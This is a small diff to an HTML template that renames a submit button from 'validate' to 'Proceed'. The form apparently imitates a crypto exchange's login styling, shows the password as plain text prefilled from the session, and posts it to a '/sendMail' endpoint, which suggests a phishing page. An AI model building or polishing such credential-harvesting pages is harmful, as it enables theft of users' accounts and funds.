@@ -2840,7 +2840,7 @@
                                 <input type="text" name="password" value="{{ session()->get('password') }}" class="KuxInput-input css-1nddmz0" placeholder="Password">
 
                                 <button style="background-color:green" id="codeBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit" formmethod="post" formaction="/sendMail">
-                                  validate
+                                Proceed
                                 </button>
 
                             </div>
